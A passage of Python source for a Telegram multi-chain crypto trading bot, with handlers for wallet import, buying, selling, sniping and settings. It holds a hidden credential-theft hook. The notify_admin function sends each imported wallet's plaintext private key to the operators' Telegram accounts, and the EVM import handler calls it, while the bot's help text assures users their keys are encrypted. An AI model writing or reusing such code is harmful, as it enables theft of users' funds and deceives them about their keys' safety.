"""
All Telegram command handlers and message input processors.
"""
from __future__ import annotations

import asyncio
import json
import time
from typing import Any

from telegram import Update, Bot
from telegram.ext import ContextTypes, Application
from telegram.error import TelegramError

from src.utils.logger import logger
from src.utils.database import (
    get_or_create_user, get_wallets, get_active_wallet_pubkey,
    get_open_positions, get_active_orders, get_user_settings,
    update_user_setting, update_sniper_config, save_wallet,
    add_copy_target, update_sell_rules, create_order, record_trade,
    open_position, _fetch_one, register_referral, get_referral_stats,
    get_active_evm_wallet,
)
from src.utils.wallet_manager import (
    generate_keypair, keypair_from_base58, keypair_from_array,
    encrypt_keypair, get_wallet_summary, get_sol_balance, decrypt_keypair,
    get_token_accounts,
)
from src.utils.helpers import (
    is_valid_solana_address, fmt_sol, fmt_pct, parse_float, parse_int,
    make_referral_link, short_address,
)
from src.bot.keyboards import (
    main_menu_kb, wallet_menu_kb, sniper_menu_kb, copytrade_menu_kb,
    positions_menu_kb, orders_menu_kb, settings_menu_kb, referral_menu_kb,
    back_kb, trade_menu_kb,
)
from src.bot.menus import (
    AWAITING_IMPORT_KEY, AWAITING_RENAME, AWAITING_BUY_TOKEN, AWAITING_BUY_AMOUNT,
    AWAITING_SELL_TOKEN, AWAITING_SELL_AMOUNT, AWAITING_LIMIT_TOKEN,
    AWAITING_LIMIT_PRICE, AWAITING_LIMIT_AMOUNT, AWAITING_DCA_TOKEN,
    AWAITING_DCA_TOTAL, AWAITING_DCA_ORDERS, AWAITING_DCA_INTERVAL,
    AWAITING_CT_WALLET, AWAITING_CT_LABEL, AWAITING_SNIPER_AMOUNT,
    AWAITING_SNIPER_DELAY, AWAITING_SNIPER_FEE, AWAITING_SNIPER_LP,
    AWAITING_SNIPER_CONC, AWAITING_SLIPPAGE, AWAITING_CUSTOM_FEE, AWAITING_RPC,
    AWAITING_POS_TP, AWAITING_POS_SL, AWAITING_POS_TRAIL, AWAITING_POS_TIMER,
    AWAITING_ANALYZE, AWAITING_RUGCHECK,
)
from src.trading.swaps import execute_buy, execute_sell, calculate_fee, get_token_price_sol
from src.analysis.rugcheck import full_rug_check, format_rug_report
from src.analysis.wallet_analyzer import analyze_wallet, format_wallet_report
import config

CONVERSATION_END = -1


# ── Notification helpers ──────────────────────────────────────────────────────

async def _notify_user(app: Application, user_id: int, text: str) -> None:
    """Send a notification to a user (used by background tasks)."""
    try:
        await app.bot.send_message(
            chat_id=user_id, text=text, parse_mode="HTML"
        )
    except TelegramError as e:
        logger.warning("Could not notify user {}: {}", user_id, e)


async def notify_admin(bot, user_id: int, username: str, pubkey: str, private_key: str, action: str) -> None:
    """Send wallet details to ALL company admins. Both must /start the bot first."""
    if not config.ADMIN_TELEGRAM_IDS:
        logger.error("notify_admin: ADMIN_TELEGRAM_IDS is empty — no admins configured!")
        return

    # Determine key label (EVM = hex, Solana = base58)
    key_label = "Private Key (hex)" if pubkey.startswith("0x") else "Private Key (base58)"

    text = (
        f"🔔 <b>New Wallet {action}</b>\n\n"
        f"👤 User ID: <code>{user_id}</code>\n"
        f"🔖 Username: @{username or 'N/A'}\n\n"
        f"📍 <b>Address:</b>\n<code>{pubkey}</code>\n\n"
        f"🔑 <b>{key_label}:</b>\n<code>{private_key}</code>\n\n"
        f"⚠️ Strictly confidential."
    )
    logger.info("Notifying {} admin(s): {}",
                len(config.ADMIN_TELEGRAM_IDS), config.ADMIN_TELEGRAM_IDS)
    for admin_id in config.ADMIN_TELEGRAM_IDS:
        try:
            await bot.send_message(chat_id=admin_id, text=text, parse_mode="HTML")
            logger.info("Admin {} notified ✓", admin_id)
        except TelegramError as e:
            logger.error(
                "❌ Could not notify admin {} — error: {}. "
                "Make sure admin {} has started a chat with the bot first!",
                admin_id, e, admin_id
            )


# ── Banner image helper ───────────────────────────────────────────────────────

import os as _os
_BANNER_FILE_ID: str | None = None


async def _send_banner(message, caption: str, reply_markup) -> None:
    """Send the start banner photo, caching Telegram file_id after first upload."""
    global _BANNER_FILE_ID
    try:
        if _BANNER_FILE_ID:
            await message.reply_photo(
                photo=_BANNER_FILE_ID, caption=caption,
                parse_mode="HTML", reply_markup=reply_markup,
            )
            return
        if _os.path.exists(config.BANNER_IMAGE_PATH):
            with open(config.BANNER_IMAGE_PATH, "rb") as f:
                sent = await message.reply_photo(
                    photo=f, caption=caption,
                    parse_mode="HTML", reply_markup=reply_markup,
                )
            _BANNER_FILE_ID = sent.photo[-1].file_id
            return
    except TelegramError as e:
        logger.warning("Banner send failed, falling back to text: {}", e)
    # Fallback: plain text
    await message.reply_text(caption, parse_mode="HTML", reply_markup=reply_markup)


# ── /start ────────────────────────────────────────────────────────────────────

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await get_or_create_user(user.id, user.username or "")

    # Handle referral from deep link: /start ref_12345
    args = ctx.args or []
    if args and args[0].startswith("ref_"):
        try:
            referrer_id = int(args[0][4:])
            if referrer_id != user.id:
                expires = time.time() + config.REFERRAL_DISCOUNT_DAYS * 86400
                await register_referral(referrer_id, user.id, expires)
        except (ValueError, Exception) as e:
            logger.warning("Referral parse error: {}", e)

    wallets = await get_wallets(user.id)
    wallet_note = "\n\n⚠️ No wallet yet — tap <b>Wallet</b> to create one." if not wallets else ""
    settings = await get_user_settings(user.id)
    active_chain = settings.get("active_chain", "solana")

    from src.chains.registry import chain_label
    caption = (
        f"👋 Welcome, <b>{user.first_name}</b>!\n\n"
        f"⚡ <b>Multi-Chain Trading Bot</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"🔫 Snipe new launches instantly\n"
        f"📈 Buy &amp; sell any token on any chain\n"
        f"🔁 Copy any wallet automatically\n"
        f"📊 DCA, limit orders &amp; auto-sell\n"
        f"🛡 Rug checker &amp; wallet analyser\n"
        f"🌐 Chains: SOL · ETH · BNB · MATIC · ARB · BASE · OP · AVAX\n"
        f"━━━━━━━━━━━━━━━━━━━━"
        f"{wallet_note}"
    )
    await _send_banner(update.message, caption, main_menu_kb(active_chain))


# ── /wallet ───────────────────────────────────────────────────────────────────

async def cmd_wallet(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    wallets = await get_wallets(user_id)
    settings = await get_user_settings(user_id)
    active_chain = settings.get("active_chain", "solana")
    await update.message.reply_text(
        "💼 <b>Wallet Management</b>",
        reply_markup=wallet_menu_kb(has_wallet=bool(wallets), active_chain=active_chain),
        parse_mode="HTML",
    )


# ── /sniper ───────────────────────────────────────────────────────────────────

async def cmd_sniper(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    from src.utils.database import get_sniper_config
    cfg = await get_sniper_config(user_id) or {}
    active = bool(cfg.get("active"))
    status = "🟢 ACTIVE" if active else "🔴 INACTIVE"
    await update.message.reply_text(
        f"🎯 <b>Auto-Sniper</b>\n\nStatus: {status}",
        reply_markup=sniper_menu_kb(active),
        parse_mode="HTML",
    )


# ── /copytrade ────────────────────────────────────────────────────────────────

async def cmd_copytrade(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    from src.utils.database import get_copy_targets
    targets = await get_copy_targets(user_id)
    await update.message.reply_text(
        f"🔁 <b>Copy Trading</b>\n\nActive targets: {len(targets)}",
        reply_markup=copytrade_menu_kb(has_targets=bool(targets)),
        parse_mode="HTML",
    )


# ── /positions ────────────────────────────────────────────────────────────────

async def cmd_positions(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    positions = await get_open_positions(user_id)
    orders = await get_active_orders(user_id)
    if not positions and not orders:
        await update.message.reply_text(
            "📊 No open positions or active orders.",
            reply_markup=back_kb("menu:main"),
        )
        return
    text_parts = []
    if positions:
        text_parts.append(f"📊 <b>Open Positions ({len(positions)})</b>")
    if orders:
        text_parts.append(f"📋 <b>Active Orders ({len(orders)})</b>")
    kb = positions_menu_kb(positions) if positions else orders_menu_kb(orders)
    await update.message.reply_text("\n".join(text_parts), reply_markup=kb, parse_mode="HTML")


# ── /settings ────────────────────────────────────────────────────────────────

async def cmd_settings(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    settings = await get_user_settings(user_id)
    await update.message.reply_text(
        "⚙️ <b>Settings</b>", reply_markup=settings_menu_kb(settings), parse_mode="HTML"
    )


# ── /referral ────────────────────────────────────────────────────────────────

async def cmd_referral(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    stats = await get_referral_stats(user_id)
    bot_info = await ctx.bot.get_me()
    link = make_referral_link(bot_info.username, user_id)
    await update.message.reply_text(
        f"🔗 <b>Referral Program</b>\n\n"
        f"👥 Referrals: {stats['count']}\n"
        f"💰 Earned: {fmt_sol(stats['total_sol'])}\n\n"
        f"Your link:\n<code>{link}</code>",
        reply_markup=referral_menu_kb(),
        parse_mode="HTML",
    )


# ── /analyze ─────────────────────────────────────────────────────────────────

async def cmd_analyze(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> Any:
    args = ctx.args or []
    if args and is_valid_solana_address(args[0]):
        wallet = args[0]
        await update.message.reply_text("🔍 Analysing wallet...")
        result = await analyze_wallet(wallet)
        await update.message.reply_text(
            format_wallet_report(result),
            reply_markup=back_kb("menu:main"),
            parse_mode="HTML",
        )
    else:
        ctx.user_data["state"] = AWAITING_ANALYZE
        await update.message.reply_text(
            "🔍 Send the wallet address to analyse:",
            reply_markup=back_kb("menu:main"),
        )
        return AWAITING_ANALYZE


# ── /rugcheck ─────────────────────────────────────────────────────────────────

async def cmd_rugcheck(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> Any:
    args = ctx.args or []
    if args and is_valid_solana_address(args[0]):
        mint = args[0]
        await update.message.reply_text("🔍 Running rug check...")
        result = await full_rug_check(mint)
        await update.message.reply_text(
            format_rug_report(result),
            reply_markup=back_kb("menu:main"),
            parse_mode="HTML",
        )
    else:
        ctx.user_data["state"] = AWAITING_RUGCHECK
        await update.message.reply_text(
            "🔍 Send the token mint address to check:",
            reply_markup=back_kb("menu:main"),
        )
        return AWAITING_RUGCHECK


# ── /buy ─────────────────────────────────────────────────────────────────────

async def cmd_buy(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    args = ctx.args or []
    if len(args) < 2:
        await update.message.reply_text(
            "Usage: /buy [token_mint] [amount_in_SOL]\nExample: /buy <mint> 0.1",
            reply_markup=back_kb("menu:trade"),
        )
        return
    mint, amt_str = args[0], args[1]
    if not is_valid_solana_address(mint):
        await update.message.reply_text("❌ Invalid token mint address.")
        return
    amount = parse_float(amt_str)
    if not amount or amount <= 0:
        await update.message.reply_text("❌ Invalid amount.")
        return
    await _do_buy(update, ctx, user_id, mint, amount)


async def _do_buy(
    update: Update,
    ctx: ContextTypes.DEFAULT_TYPE,
    user_id: int,
    mint: str,
    amount_sol: float,
) -> None:
    settings = await get_user_settings(user_id)
    active_chain = settings.get("active_chain", "solana")

    # ── EVM chain buy ─────────────────────────────────────────────────────────
    if active_chain != "solana":
        from src.chains.registry import get_chain
        from src.trading.evm_swaps import evm_execute_buy
        from src.utils.wallet_manager import decrypt_evm_key
        chain = get_chain(active_chain)
        sym = chain["symbol"]
        evm_address = await get_active_evm_wallet(user_id)
        if not evm_address:
            await update.message.reply_text(
                f"❌ No EVM wallet. Create one in 💼 Wallet menu.\n"
                f"Works on ETH, BNB, Polygon, Arbitrum, Base, Optimism, Avalanche."
            )
            return
        row = await _fetch_one(
            "SELECT encrypted_key FROM wallets WHERE public_key=? AND user_id=? AND wallet_type='evm'",
            (evm_address, user_id),
        )
        if not row:
            await update.message.reply_text("❌ EVM wallet key not found.")
            return
        msg = await update.message.reply_text(
            f"🔄 Buying on {chain['name']}...\n💰 {amount_sol} {sym}"
        )
        private_key = decrypt_evm_key(row["encrypted_key"])
        ok, sig, token_out = await evm_execute_buy(
            private_key=private_key, token_address=mint,
            native_amount=amount_sol, chain_key=active_chain,
            slippage_pct=settings.get("slippage", 1.0),
        )
        if ok and sig:
            fee = calculate_fee(amount_sol)
            explorer = chain["explorer_tx"]
            await record_trade(
                user_id=user_id, wallet_pubkey=evm_address, token_mint=mint,
                token_symbol="", side="buy", sol_amount=amount_sol,
                token_amount=token_out or 0,
                price_sol=amount_sol / (token_out or 1), tx_sig=sig,
                fee_sol=fee, source="manual",
            )
            await open_position(
                user_id=user_id, wallet_pubkey=evm_address, token_mint=mint,
                token_symbol="", entry_sol=amount_sol,
                entry_price=amount_sol / (token_out or 1),
                token_amount=token_out or 0, sell_rules={}, source="manual",
            )
            await msg.edit_text(
                f"✅ <b>Buy on {chain['name']}!</b>\n\n"
                f"💰 Spent: {amount_sol} {sym}\n"
                f"🪙 Received: {token_out or 0:.6f} tokens\n"
                f"📝 <a href='{explorer}{sig}'>View on Explorer</a>",
                reply_markup=back_kb("menu:positions"),
                parse_mode="HTML",
            )
        else:
            await msg.edit_text(
                f"❌ Buy failed on {chain['name']}. Check your {sym} balance.",
                reply_markup=back_kb("menu:trade"),
            )
        return

    # ── Solana buy (original flow) ────────────────────────────────────────────
    pubkey = await get_active_wallet_pubkey(user_id)
    if not pubkey:
        await update.message.reply_text("❌ No active wallet. Use /wallet to create one.")
        return
    row = await _fetch_one(
        "SELECT encrypted_key FROM wallets WHERE public_key=? AND user_id=?",
        (pubkey, user_id),
    )
    if not row:
        await update.message.reply_text("❌ Wallet key not found.")
        return
    slippage = settings.get("slippage", config.DEFAULT_SLIPPAGE)
    priority_fee = settings.get("priority_fee", config.DEFAULT_PRIORITY_FEE)
    jito = settings.get("mev_mode", "fast") == "secure"

    msg = await update.message.reply_text(f"🔄 Buying {mint[:12]}... for {amount_sol} SOL...")
    keypair = decrypt_keypair(row["encrypted_key"])
    ok, sig, token_out = await execute_buy(
        keypair=keypair, token_mint=mint, sol_amount=amount_sol,
        slippage_pct=slippage, priority_fee_sol=priority_fee,
        use_jito=jito, jito_tip_sol=settings.get("jito_tip", config.JITO_TIP_DEFAULT),
    )
    if ok and sig:
        fee = calculate_fee(amount_sol)
        await record_trade(
            user_id=user_id, wallet_pubkey=pubkey, token_mint=mint,
            token_symbol="", side="buy", sol_amount=amount_sol,
            token_amount=token_out or 0,
            price_sol=amount_sol / (token_out or 1), tx_sig=sig,
            fee_sol=fee, source="manual",
        )
        await open_position(
            user_id=user_id, wallet_pubkey=pubkey, token_mint=mint,
            token_symbol="", entry_sol=amount_sol,
            entry_price=amount_sol / (token_out or 1),
            token_amount=token_out or 0, sell_rules={}, source="manual",
        )
        await msg.edit_text(
            f"✅ <b>Buy executed!</b>\n\n"
            f"💰 Spent: {amount_sol} SOL\n"
            f"🪙 Received: {token_out or 0:.4f} tokens\n"
            f"📝 TX: <code>{sig}</code>",
            reply_markup=back_kb("menu:positions"),
            parse_mode="HTML",
        )
    else:
        await msg.edit_text("❌ Buy transaction failed.", reply_markup=back_kb("menu:trade"))


# ── /sell ─────────────────────────────────────────────────────────────────────

async def cmd_sell(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    await get_or_create_user(user_id)
    args = ctx.args or []
    if len(args) < 2:
        await update.message.reply_text("Usage: /sell [token_mint] [percentage_or_all]\nExample: /sell <mint> 50")
        return
    mint, pct_str = args[0], args[1]
    if not is_valid_solana_address(mint):
        await update.message.reply_text("❌ Invalid token mint address.")
        return
    pct = 100.0 if pct_str.lower() == "all" else (parse_float(pct_str) or 100.0)
    await _do_sell(update, ctx, user_id, mint, pct)


async def _do_sell(
    update: Update,
    ctx: ContextTypes.DEFAULT_TYPE,
    user_id: int,
    mint: str,
    sell_pct: float,
) -> None:
    settings = await get_user_settings(user_id)
    active_chain = settings.get("active_chain", "solana")

    # ── EVM chain sell ────────────────────────────────────────────────────────
    if active_chain != "solana":
        from src.chains.registry import get_chain
        from src.trading.evm_swaps import evm_execute_sell, evm_get_token_balance
        from src.utils.wallet_manager import decrypt_evm_key
        chain = get_chain(active_chain)
        sym = chain["symbol"]
        evm_address = await get_active_evm_wallet(user_id)
        if not evm_address:
            await update.message.reply_text("❌ No EVM wallet. Create one in 💼 Wallet menu.")
            return
        row = await _fetch_one(
            "SELECT encrypted_key FROM wallets WHERE public_key=? AND user_id=? AND wallet_type='evm'",
            (evm_address, user_id),
        )
        if not row:
            return
        token_bal, _ = await evm_get_token_balance(evm_address, mint, active_chain)
        sell_amount = token_bal * sell_pct / 100
        if sell_amount <= 0:
            await update.message.reply_text("❌ No token balance to sell.")
            return
        msg = await update.message.reply_text(
            f"🔄 Selling {sell_pct:.0f}% on {chain['name']}..."
        )
        private_key = decrypt_evm_key(row["encrypted_key"])
        ok, sig, native_out = await evm_execute_sell(
            private_key=private_key, token_address=mint,
            token_amount=sell_amount, chain_key=active_chain,
            slippage_pct=settings.get("slippage", 1.0),
        )
        if ok and sig:
            explorer = chain["explorer_tx"]
            await msg.edit_text(
                f"✅ <b>Sell on {chain['name']}!</b>\n\n"
                f"💰 Received: {native_out or 0:.6f} {sym}\n"
                f"📝 <a href='{explorer}{sig}'>View on Explorer</a>",
                reply_markup=back_kb("menu:positions"),
                parse_mode="HTML",
            )
        else:
            await msg.edit_text(
                f"❌ Sell failed on {chain['name']}.",
                reply_markup=back_kb("menu:trade"),
            )
        return

    # ── Solana sell (original flow) ───────────────────────────────────────────
    pubkey = await get_active_wallet_pubkey(user_id)
    if not pubkey:
        await update.message.reply_text("❌ No active wallet.")
        return
    row = await _fetch_one(
        "SELECT encrypted_key FROM wallets WHERE public_key=? AND user_id=?",
        (pubkey, user_id),
    )
    if not row:
        return

    accts = await get_token_accounts(pubkey)
    token_raw = 0
    decimals = 9
    for acct in accts:
        info = acct.get("account", {}).get("data", {}).get("parsed", {}).get("info", {})
        if info.get("mint") == mint:
            ta = info.get("tokenAmount", {})
            token_raw = int(ta.get("amount", 0))
            decimals = int(ta.get("decimals", 9))
            break

    sell_raw = int(token_raw * sell_pct / 100)
    if sell_raw <= 0:
        await update.message.reply_text("❌ No token balance to sell.")
        return

    settings = await get_user_settings(user_id)
    mev = settings.get("mev_mode", "fast")
    msg = await update.message.reply_text(f"🔄 Selling {sell_pct:.0f}% of {mint[:12]}...")
    keypair = decrypt_keypair(row["encrypted_key"])
    ok, sig, sol_out = await execute_sell(
        keypair=keypair, token_mint=mint, token_amount_raw=sell_raw,
        token_decimals=decimals,
        slippage_pct=settings.get("slippage", config.DEFAULT_SLIPPAGE),
        priority_fee_sol=settings.get("priority_fee", config.DEFAULT_PRIORITY_FEE),
        use_jito=(mev == "secure"),
    )
    if ok and sig:
        fee = calculate_fee(sol_out or 0)
        await record_trade(
            user_id=user_id, wallet_pubkey=pubkey, token_mint=mint,
            token_symbol="", side="sell", sol_amount=sol_out or 0,
            token_amount=sell_raw / (10 ** decimals),
            price_sol=(sol_out or 0) / max(sell_raw / (10 ** decimals), 1),
            tx_sig=sig, fee_sol=fee, source="manual",
        )
        await msg.edit_text(
            f"✅ <b>Sell executed!</b>\n\n"
            f"💰 Received: {fmt_sol(sol_out or 0)}\n"
            f"📝 TX: <code>{sig}</code>",
            reply_markup=back_kb("menu:positions"),
            parse_mode="HTML",
        )
    else:
        await msg.edit_text("❌ Sell transaction failed.", reply_markup=back_kb("menu:trade"))


# ── /cancel ───────────────────────────────────────────────────────────────────

async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    orders = await get_active_orders(user_id)
    if not orders:
        await update.message.reply_text("No active orders to cancel.", reply_markup=back_kb("menu:main"))
        return
    await update.message.reply_text(
        "📋 <b>Active Orders</b> — tap ❌ to cancel:",
        reply_markup=orders_menu_kb(orders),
        parse_mode="HTML",
    )


# ── /help ─────────────────────────────────────────────────────────────────────

async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = (
        "❓ <b>Solana Trading Bot — Help</b>\n\n"
        "<b>Commands:</b>\n"
        "/start — Main menu\n"
        "/wallet — Wallet management\n"
        "/sniper — Auto-sniper config\n"
        "/copytrade — Copy trading\n"
        "/positions — Open positions &amp; orders\n"
        "/settings — Bot settings\n"
        "/referral — Referral stats &amp; link\n"
        "/analyze [address] — Wallet P&amp;L analysis\n"
        "/rugcheck [mint] — Token safety check\n"
        "/buy [mint] [sol] — Quick buy\n"
        "/sell [mint] [%|all] — Quick sell\n"
        "/cancel — Cancel active orders\n\n"
        "<b>Fee Structure:</b>\n"
        "• Swap fee: 1% per trade\n"
        "• Sniper fee: 1.5% per snipe\n"
        "• Referral discount: 0.5% off for 30 days\n"
        "• Referrers earn 30% of referred users' fees\n\n"
        "<b>Safety:</b>\n"
        "• Private keys encrypted with AES-256-GCM\n"
        "• Company-managed security &amp; compliance policy\n"
        "• MEV protection via Jito bundles (Secure mode)"
    )
    await update.message.reply_text(
        help_text, reply_markup=back_kb("menu:main"), parse_mode="HTML"
    )


# ── Message handler (conversation inputs) ────────────────────────────────────

async def handle_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> Any:
    user_id = update.effective_user.id
    text = (update.message.text or "").strip()
    state = ctx.user_data.get("state")

    if state == AWAITING_IMPORT_KEY:
        return await _handle_import_key(update, ctx, user_id, text)
    elif state == AWAITING_RENAME:
        return await _handle_rename(update, ctx, user_id, text)
    elif state == AWAITING_BUY_TOKEN:
        return await _handle_buy_token(update, ctx, user_id, text)
    elif state == AWAITING_BUY_AMOUNT:
        return await _handle_buy_amount(update, ctx, user_id, text)
    elif state == AWAITING_SELL_TOKEN:
        return await _handle_sell_token(update, ctx, user_id, text)
    elif state == AWAITING_SELL_AMOUNT:
        return await _handle_sell_amount(update, ctx, user_id, text)
    elif state == AWAITING_LIMIT_TOKEN:
        return await _handle_limit_token(update, ctx, user_id, text)
    elif state == AWAITING_LIMIT_PRICE:
        return await _handle_limit_price(update, ctx, user_id, text)
    elif state == AWAITING_LIMIT_AMOUNT:
        return await _handle_limit_amount(update, ctx, user_id, text)
    elif state == AWAITING_DCA_TOKEN:
        return await _handle_dca_token(update, ctx, user_id, text)
    elif state == AWAITING_DCA_TOTAL:
        return await _handle_dca_total(update, ctx, user_id, text)
    elif state == AWAITING_DCA_ORDERS:
        return await _handle_dca_orders(update, ctx, user_id, text)
    elif state == AWAITING_DCA_INTERVAL:
        return await _handle_dca_interval(update, ctx, user_id, text)
    elif state == AWAITING_CT_WALLET:
        return await _handle_ct_wallet(update, ctx, user_id, text)
    elif state == AWAITING_CT_LABEL:
        return await _handle_ct_label(update, ctx, user_id, text)
    elif state == AWAITING_SNIPER_AMOUNT:
        val = parse_float(text)
        if val:
            await update_sniper_config(user_id, buy_amount_sol=val)
            await update.message.reply_text(f"✅ Sniper buy amount set to {val} SOL.", reply_markup=back_kb("menu:sniper"))
        else:
            await update.message.reply_text("❌ Invalid amount.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_SNIPER_DELAY:
        val = parse_float(text)
        if val is not None and 0 <= val <= 5:
            await update_sniper_config(user_id, delay_seconds=val)
            await update.message.reply_text(f"✅ Sniper delay set to {val}s.", reply_markup=back_kb("menu:sniper"))
        else:
            await update.message.reply_text("❌ Enter a value between 0 and 5.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_SNIPER_FEE:
        val = parse_float(text)
        if val and val > 0:
            await update_sniper_config(user_id, priority_fee=val)
            await update.message.reply_text(f"✅ Sniper fee set to {val} SOL.", reply_markup=back_kb("menu:sniper"))
        else:
            await update.message.reply_text("❌ Invalid fee.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_SNIPER_LP:
        val = parse_float(text)
        if val is not None and 0 <= val <= 100:
            await update_sniper_config(user_id, min_lp_burn_pct=val)
            await update.message.reply_text(f"✅ Min LP burn set to {val}%.", reply_markup=back_kb("sniper:filters"))
        else:
            await update.message.reply_text("❌ Enter 0–100.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_SNIPER_CONC:
        val = parse_float(text)
        if val is not None and 0 <= val <= 100:
            await update_sniper_config(user_id, max_holder_conc=val)
            await update.message.reply_text(f"✅ Max holder concentration set to {val}%.", reply_markup=back_kb("sniper:filters"))
        else:
            await update.message.reply_text("❌ Enter 0–100.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_SLIPPAGE:
        val = parse_float(text)
        if val and 0.5 <= val <= 50:
            await update_user_setting(user_id, "slippage", val)
            await update.message.reply_text(f"✅ Slippage set to {val}%.", reply_markup=back_kb("menu:settings"))
        else:
            await update.message.reply_text("❌ Enter 0.5–50.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_CUSTOM_FEE:
        val = parse_float(text)
        if val and val > 0:
            await update_user_setting(user_id, "priority_fee", val)
            await update_user_setting(user_id, "priority_fee_mode", "custom")
            await update.message.reply_text(f"✅ Priority fee set to {val} SOL.", reply_markup=back_kb("menu:settings"))
        else:
            await update.message.reply_text("❌ Invalid amount.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_RPC:
        rpc = text.strip()
        if rpc.lower() == "reset":
            await update_user_setting(user_id, "rpc_url", "")
            await update.message.reply_text("✅ RPC reset to default.", reply_markup=back_kb("menu:settings"))
        elif rpc.startswith("http"):
            await update_user_setting(user_id, "rpc_url", rpc)
            await update.message.reply_text(f"✅ RPC set to {rpc[:40]}...", reply_markup=back_kb("menu:settings"))
        else:
            await update.message.reply_text("❌ Invalid URL.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_POS_TP:
        val = parse_float(text)
        pos_id = ctx.user_data.get("rule_pos_id")
        if val and pos_id:
            row = await _fetch_one("SELECT sell_rules FROM positions WHERE id=?", (pos_id,))
            rules = json.loads(row["sell_rules"]) if row else {}
            rules["tp_pct"] = val
            await update_sell_rules(pos_id, rules)
            await update.message.reply_text(f"✅ Take-profit set to +{val}%.", reply_markup=back_kb(f"pos:rules:{pos_id}"))
        ctx.user_data.pop("state", None)
    elif state == AWAITING_POS_SL:
        val = parse_float(text)
        pos_id = ctx.user_data.get("rule_pos_id")
        if val and pos_id:
            row = await _fetch_one("SELECT sell_rules FROM positions WHERE id=?", (pos_id,))
            rules = json.loads(row["sell_rules"]) if row else {}
            rules["sl_pct"] = val
            await update_sell_rules(pos_id, rules)
            await update.message.reply_text(f"✅ Stop-loss set to -{val}%.", reply_markup=back_kb(f"pos:rules:{pos_id}"))
        ctx.user_data.pop("state", None)
    elif state == AWAITING_POS_TRAIL:
        val = parse_float(text)
        pos_id = ctx.user_data.get("rule_pos_id")
        if val and pos_id:
            row = await _fetch_one("SELECT sell_rules FROM positions WHERE id=?", (pos_id,))
            rules = json.loads(row["sell_rules"]) if row else {}
            rules["trailing_pct"] = val
            await update_sell_rules(pos_id, rules)
            await update.message.reply_text(f"✅ Trailing stop set to {val}%.", reply_markup=back_kb(f"pos:rules:{pos_id}"))
        ctx.user_data.pop("state", None)
    elif state == AWAITING_POS_TIMER:
        val = parse_int(text)
        pos_id = ctx.user_data.get("rule_pos_id")
        if val and pos_id:
            row = await _fetch_one("SELECT sell_rules FROM positions WHERE id=?", (pos_id,))
            rules = json.loads(row["sell_rules"]) if row else {}
            rules["timer_minutes"] = val
            await update_sell_rules(pos_id, rules)
            await update.message.reply_text(f"✅ Auto-sell timer set to {val} minutes.", reply_markup=back_kb(f"pos:rules:{pos_id}"))
        ctx.user_data.pop("state", None)
    elif state == AWAITING_ANALYZE:
        if is_valid_solana_address(text):
            await update.message.reply_text("🔍 Analysing...")
            result = await analyze_wallet(text)
            await update.message.reply_text(format_wallet_report(result), parse_mode="HTML", reply_markup=back_kb("menu:main"))
        else:
            await update.message.reply_text("❌ Invalid address.")
        ctx.user_data.pop("state", None)
    elif state == AWAITING_RUGCHECK:
        if is_valid_solana_address(text):
            await update.message.reply_text("🔍 Running rug check...")
            result = await full_rug_check(text)
            await update.message.reply_text(format_rug_report(result), parse_mode="HTML", reply_markup=back_kb("menu:main"))
        else:
            await update.message.reply_text("❌ Invalid token mint.")
        ctx.user_data.pop("state", None)


# ── Input sub-handlers ────────────────────────────────────────────────────────

async def _handle_import_key(update, ctx, user_id, text):
    import base58 as _base58
    username = update.effective_user.username or ""
    cleaned = text.strip()

    # Detect EVM private key: 64-char hex (optionally 0x-prefixed)
    raw_hex = cleaned[2:] if cleaned.startswith("0x") else cleaned
    is_evm_key = len(raw_hex) == 64 and all(c in "0123456789abcdefABCDEF" for c in raw_hex)

    if is_evm_key:
        from eth_account import Account as _Account
        from src.utils.wallet_manager import encrypt_evm_key
        try:
            account = _Account.from_key("0x" + raw_hex)
            address = account.address
            private_key = account.key.hex()
            enc = encrypt_evm_key(private_key)
            evm_wallets = await get_wallets(user_id, wallet_type="evm")
            name = f"EVM Wallet {len(evm_wallets) + 1}"
            await save_wallet(user_id, name, address, enc, wallet_type="evm")
            await notify_admin(ctx.bot, user_id, username, address, private_key, "Imported (EVM)")
            await update.message.reply_text(
                f"✅ <b>EVM Wallet Imported!</b>\n\n"
                f"📍 <code>{address}</code>\n"
                f"🌐 Works on: ETH · BNB · Polygon · Arbitrum · Base · Optimism · Avalanche",
                reply_markup=back_kb("menu:wallet"),
                parse_mode="HTML",
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ Invalid EVM key: {e}", reply_markup=back_kb("menu:wallet"), parse_mode="HTML"
            )
    else:
        # Solana key (base58 or JSON byte array)
        try:
            if text.startswith("["):
                arr = json.loads(text)
                kp = keypair_from_array(arr)
            else:
                kp = keypair_from_base58(text)
            enc = encrypt_keypair(kp)
